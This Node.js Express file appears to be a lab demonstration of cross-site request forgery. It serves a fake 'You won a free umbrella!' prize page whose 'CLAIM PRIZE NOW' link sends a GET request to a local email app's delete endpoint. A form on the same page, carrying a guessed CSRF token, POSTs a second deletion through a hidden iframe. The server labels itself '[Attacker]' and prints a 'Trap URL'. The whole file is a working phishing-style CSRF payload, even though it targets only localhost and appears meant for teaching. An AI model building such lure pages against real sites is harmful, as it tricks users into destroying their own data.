const express = require('express');
const app = express();
const port = 5000;

app.get('/weather-promo.html', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>You Won!</title></head>
        <body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
            <h1 style="color: red;">You won a free umbrella! </h1>
            <p>Click the button below to add it to your account:</p>
            
            <a href="http://localhost:3000/api/emails/delete/1" target="_blank" style="display:inline-block; font-size: 24px; padding: 15px 30px; background: yellow; text-decoration: none; color: black; border: 2px solid black; border-radius: 5px; font-weight: bold;">
                ▶ CLAIM PRIZE NOW ◀
            </a>

            <br><br><br><br>

            <form action="http://localhost:3000/api/emails/delete/2" method="POST" target="hidden-frame">
                <input type="hidden" name="_csrf_token" value="fake-token-guess">
                <button type="submit" style="font-size: 14px; padding: 5px;">Claim Bonus (POST Attack)</button>
            </form>
            <iframe name="hidden-frame" style="display:none;"></iframe>
            
        </body>
        </html>
    `);
});

app.listen(port, () => console.log(`[Attacker] Running. Trap URL: http://127.0.0.1:5000/weather-promo.html`));